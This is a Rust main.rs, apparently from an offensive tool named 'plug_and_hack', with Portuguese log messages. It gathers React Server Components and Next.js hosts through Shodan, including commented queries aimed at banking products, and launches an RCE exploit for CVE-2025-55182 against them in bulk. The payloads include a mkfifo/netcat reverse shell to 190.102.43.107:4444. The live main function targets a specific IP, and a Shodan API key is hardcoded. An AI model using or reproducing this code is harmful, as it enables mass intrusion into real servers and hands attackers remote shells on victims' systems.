// mod exploit;
// mod osint;
//
// use exploit::react::react_unsafely_deserialize_rce;
// use std::error::Error;
// use futures::future::join_all;
// use crate::osint::shodan;
// use crate::osint::shodan::shodan::{Shodan, ShodanSearchResponse};
//
// const PAYLOAD: &str = "rm /tmp/f; mkfifo /tmp/f; nc 190.102.43.107 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1";
// const SHODAN_KEY: &str = "2GgOLxfUg84qh7TaRedXMFch9UVjjup6";
//
// #[tokio::main]
// async fn main() -> Result<(), Box<dyn Error>> {
//     let targets = gather_react_rsc_targets().await?;
//     if !targets.is_empty() {
//         run_mass_exploit(PAYLOAD, targets, 10).await?;
//     } else {
//         println!("Nenhum alvo encontrado.");
//     }
//
//     Ok(())
// }
//
// async fn run_single_exploit(payload: &str, url: &str) -> Result<(), Box<dyn Error>> {
//     println!("[*] Enviando exploit para: {}", url);
//     react_unsafely_deserialize_rce::send(payload, url).await?;
//     println!("[+] Exploit enviado com sucesso.");
//     Ok(())
// }
//
// async fn gather_react_rsc_targets() -> Result<Vec<String>, Box<dyn Error>> {
//     println!("[*] Coletando alvos via Shodan...");
//     let client = Shodan::new(SHODAN_KEY.to_string());
//
//     let queries = vec![
//         shodan::shodan_queries::shodan_nextjs(),
//         // shodan::shodan_queries::shodan_react_router_rsc(),
//         // shodan::shodan_queries::shodan_remix_rsc(),
//         // shodan::shodan_queries::shodan_redwoodjs(),
//         // shodan::shodan_queries::shodan_waku(),
//         // shodan::shodan_queries::financial_technologies(),
//         // shodan::shodan_queries::banking_products(),
//     ];
//
//     let futures: Vec<_> = queries
//         .into_iter()
//         .map(|q| client.query_raw_many(q))
//         .collect();
//
//     let results: Vec<Vec<ShodanSearchResponse>> =
//         join_all(futures).await;
//
//     let mut all_responses = Vec::new();
//     for resps in results {
//         all_responses.extend(resps);
//     }
//
//
//     let mut all_hosts = Vec::new();
//     for response in all_responses {
//         let hosts = client.get_hosts_from_responses(response).await;
//         all_hosts.extend(hosts);
//     }
//
//     all_hosts.sort_unstable();
//     all_hosts.dedup();
//
//     println!("[+] Encontrados {} alvos únicos.", all_hosts.len());
//     Ok(all_hosts)
// }
//
// async fn run_mass_exploit(
//     payload: &str,
//     targets: Vec<String>,
//     concurrency: usize,
// ) -> Result<(), Box<dyn Error>> {
//     println!("[*] Iniciando exploração em massa (concorrência: {})...", concurrency);
//
//     let exploit = react_unsafely_deserialize_rce::ReactUnsafelyDeserializeRce::new(
//         payload.to_string(),
//         targets,
//         concurrency,
//     );
//
//     exploit.start().await?;
//     println!("[+] Exploração em massa concluída.");
//     Ok(())
// }

// src/main.rs

use plug_and_hack::core::exploit_engine::ExploitEngine;
use plug_and_hack::core::osint_provider::OsintProvider;
use plug_and_hack::engines::custom::React2ShellEngine;
use plug_and_hack::models;
use plug_and_hack::models::target::Target;
// src/main.rs
use plug_and_hack::providers::shodan::ShodanProvider;
use plug_and_hack::providers::shodan::ShodanQuery;

use plug_and_hack::pipeline::{Collector, Correlator, Modeler, Executor};

// #[tokio::main]
// async fn main() -> Result<(), ()> {
//     let shodan = ShodanProvider::new("SUA_KEY".to_string());
//
//     // 1. Coleta
//     let queries = vec![
//         ShodanQuery::new().with_vuln("CVE-2023-1234"),
//         ShodanQuery::new().with_http_component("nginx"),
//     ];
//     let responses = Collector::collect_from_provider(&shodan, queries).await.expect("ERR");
//
//     // 2. Correlação
//     let mut all_matches = Vec::new();
//     for resp in responses {
//         all_matches.extend(resp.matches);
//     }
//     let targets = Correlator::correlate_shodan(&all_matches);
//
//     // 3. Modelagem
//     let surface = Modeler::build_attack_surface(targets);
//
//
//     Ok(())
// }

// src/main.rs
// use plug_and_hack::utils::config::ConfigLoader;
//
// #[tokio::main]
// async fn main() -> Result<(), Box<dyn std::error::Error>> {
//     let config = ConfigLoader::load()?;
//
//     if let Some(shodan_cfg) = &config.shodan {
//         println!("Shodan key loaded: {}", &shodan_cfg.api_key);
//     }
//
//     // ... usar config para inicializar providers, engines, etc.
//     Ok(())
// }

#[tokio::main]
async fn main() -> Result<(), ()> {
    let target = Target {
        ip: "103.87.66.230".to_string(),
        port: 3100,
        service: Some("react-server".to_string()),
        os: None,
        domains: vec![],
        vulns: vec!["CVE-2025-55182".to_string()],
        raw_data: None,
    };

    let command = "nc 190.102.43.107 4444".to_string();
    let engine = React2ShellEngine::new(command, 1);

    engine.exploit(&target).await.expect("ERR"); // ✅ agora funciona

    println!("[+] Exploit concluído para {}:{}", target.ip, target.port);
    Ok(())
}

// use plug_and_hack::core::exploit_engine::ExploitEngine;
// use plug_and_hack::engines::custom::React2ShellEngine;
// use plug_and_hack::models::target::Target;
// use plug_and_hack::providers::shodan::{ShodanProvider, ShodanQuery};
// use plug_and_hack::utils::error::Result;
//
// #[tokio::main]
// async fn main() -> Result<()> {
//     // === 1. Configuração ===
//     let shodan_api_key = "SUA_CHAVE_SHODAN_AQUI".to_string(); // 🔑
//     let payload_command = "id".to_string(); // ← seu payload
//     let concurrency = 5;
//
//     // === 2. Inicializa Shodan ===
//     let shodan = ShodanProvider::new(shodan_api_key);
//
//     // === 3. Define queries (baseado nos filtros do Shodan) ===
//     let queries = vec![
//         // Busca por aplicações React Server Components (ex: porta 3000 + componente)
//         ShodanQuery::new()
//             .with_port("3000")
//             .with_http_component("react-server-dom-webpack"),
//
//         // Ou busca genérica por Next.js (comum com RSC)
//         ShodanQuery::new()
//             .with_http_component("next"),
//
//         // Se tiver acesso a `vuln` (plano pago), use:
//         // ShodanQuery::new().with_vuln("CVE-2025-55182"),
//     ];
//
//     // === 4. Executa as queries ===
//     println!("[*] Executando {} queries no Shodan...", queries.len());
//     let responses = shodan.search_many(queries).await?;
//
//     // === 5. Extrai alvos (IP + porta) ===
//     let mut targets = Vec::new();
//     for resp in responses {
//         for m in resp.matches {
//             if let (Some(ip), Some(port)) = (m.ip_str, m.port) {
//                 targets.push(Target {
//                     ip,
//                     port,
//                     service: m.product.or(m._shodan.and_then(|s| s.module)),
//                     os: m.os,
//                     domains: m.domains.unwrap_or_default(),
//                     vulns: vec!["CVE-2025-55182".to_string()], // assumimos vulnerabilidade
//                     raw_: None,
//                 });
//             }
//         }
//     }
//
//     println!("[+] Encontrados {} alvos potenciais", targets.len());
//     if targets.is_empty() {
//         println!("[-] Nenhum alvo encontrado. Tente ajustar as queries.");
//         return Ok(());
//     }
//
//     // === 6. Inicializa o exploit engine ===
//     let engine = React2ShellEngine::new(payload_command, concurrency);
//
//     // === 7. Dispara o exploit em todos os alvos ===
//     println!("[*] Enviando payload para {} alvos...", targets.len());
//     engine.exploit_many(&targets).await?;
//
//     println!("[+] Exploração concluída.");
//     Ok(())
// }